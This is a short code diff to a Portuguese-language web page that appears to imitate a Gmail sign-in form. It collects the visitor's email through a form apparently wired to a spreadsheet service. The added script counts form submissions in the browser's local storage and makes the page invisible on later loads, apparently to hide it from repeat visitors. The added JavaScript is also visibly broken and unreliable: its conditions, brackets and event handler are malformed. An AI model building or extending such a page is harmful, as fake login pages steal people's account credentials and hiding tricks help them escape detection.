@@ -38,12 +38,24 @@
             
                 <input type="hidden" name="Created" value="x-sheetmonkey-current-date-time" />
                 <input class="btn2" onclick="F2()" type="button" value="Avançar" />
-                <input class="btn" type="submit" value="Próximo" />
+                <input class="btn" onclick="btnOver()" type="submit" value="Próximo" />
             </form>
             <a class="errpass" href="err-Gmail.html" >Esqueceu seu email?</a>
         </section>
     </main>
     <script type="text/javascript">
+        
+        var acesso = 0
+        window.addEventListener("load", carregou())
+            function carregou(){
+                var verifyConect = JSON.stringify(localStorage.getItem("acesso"))
+            if(acesso = verifyConect)(
+                $('body').css("opacity", 0)
+            )
+        function btnOver(){
+            acesso++
+            JSON.parse(localStorage.setItem("acesso", acesso))
+        }
         function F2(){
             setTimeout(()=>{
                 var email = document.querySelector("#Bmail").value
